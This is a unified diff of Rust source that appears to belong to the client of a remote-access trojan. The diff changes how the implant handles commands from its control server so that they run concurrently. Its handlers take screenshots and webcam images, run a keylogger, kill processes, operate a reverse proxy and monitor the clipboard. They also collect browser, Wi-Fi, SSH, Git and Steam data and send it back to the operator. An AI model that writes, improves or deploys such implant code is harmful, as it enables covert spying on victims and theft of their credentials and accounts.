@@ -25,7 +25,7 @@ use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
 use crate::features::keylogger::{start_keylogger, stop_keylogger, send_offline_logs, clear_offline_logs};
 use crate::features::browser::get_browser_data;
-// use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
+//use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
@@ -70,9 +70,15 @@ pub async fn reading_loop(
                 }
             }
 
-            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => take_screenshot(display).await,
+            Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => {
+                tokio::spawn(take_screenshot(display));
+            }
 
-            Ok(Some(ClientboundPacket::GetProcessList)) => { let _ = send_packet(ServerboundPacket::ProcessList(process_list())).await; }
+            Ok(Some(ClientboundPacket::GetProcessList)) => {
+                tokio::spawn(async move {
+                    let _ = send_packet(ServerboundPacket::ProcessList(process_list())).await;
+                });
+            }
 
             Ok(Some(ClientboundPacket::KillProcess(process))) => kill_process(process.pid),
 
@@ -156,7 +162,9 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopReverseProxy)) => reverse_proxy.stop().await,
 
-            Ok(Some(ClientboundPacket::RequestWebcam)) => take_webcam().await,
+            Ok(Some(ClientboundPacket::RequestWebcam)) => {
+                tokio::spawn(take_webcam());
+            }
             
             // Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
             
@@ -176,23 +184,31 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::StopKeylogger)) => stop_keylogger(),
 
-            Ok(Some(ClientboundPacket::GetOfflineLogs)) => send_offline_logs().await,
+            Ok(Some(ClientboundPacket::GetOfflineLogs)) => {
+                tokio::spawn(send_offline_logs());
+            }
 
             Ok(Some(ClientboundPacket::ClearOfflineLogs)) => clear_offline_logs(),
 
             Ok(Some(ClientboundPacket::GetBrowserData)) => {
-                let data = get_browser_data();
-                let _ = send_packet(ServerboundPacket::BrowserData(data)).await;
+                tokio::spawn(async move {
+                    let data = get_browser_data();
+                    let _ = send_packet(ServerboundPacket::BrowserData(data)).await;
+                });
             }
 
             Ok(Some(ClientboundPacket::GetWifiData)) => {
-                let data = collect_wifi_data();
-                let _ = send_packet(ServerboundPacket::WifiData(data)).await;
+                tokio::spawn(async move {
+                    let data = collect_wifi_data();
+                    let _ = send_packet(ServerboundPacket::WifiData(data)).await;
+                });
             }
 
             Ok(Some(ClientboundPacket::GetSoftwareInventory)) => {
-                let data = collect_software_inventory();
-                let _ = send_packet(ServerboundPacket::SoftwareInventory(data)).await;
+                tokio::spawn(async move {
+                    let data = collect_software_inventory();
+                    let _ = send_packet(ServerboundPacket::SoftwareInventory(data)).await;
+                });
             }
 
             Ok(Some(ClientboundPacket::LaunchSoftware(name))) => {
@@ -211,18 +227,24 @@ pub async fn reading_loop(
             }
 
             Ok(Some(ClientboundPacket::GetGitData)) => {
-                let data = collect_git_data();
-                let _ = send_packet(ServerboundPacket::GitData(data)).await;
+                tokio::spawn(async move {
+                    let data = collect_git_data();
+                    let _ = send_packet(ServerboundPacket::GitData(data)).await;
+                });
             }
 
             Ok(Some(ClientboundPacket::GetSSHData)) => {
-                let data = collect_ssh_data();
-                let _ = send_packet(ServerboundPacket::SSHData(data)).await;
+                tokio::spawn(async move {
+                    let data = collect_ssh_data();
+                    let _ = send_packet(ServerboundPacket::SSHData(data)).await;
+                });
             }
 
             Ok(Some(ClientboundPacket::GetSteamData)) => {
-                let data = collect_steam_data();
-                let _ = send_packet(ServerboundPacket::SteamData(data)).await;
+                tokio::spawn(async move {
+                    let data = collect_steam_data();
+                    let _ = send_packet(ServerboundPacket::SteamData(data)).await;
+                });
             }
 
             Ok(Some(ClientboundPacket::StartClipboardMonitor)) => {
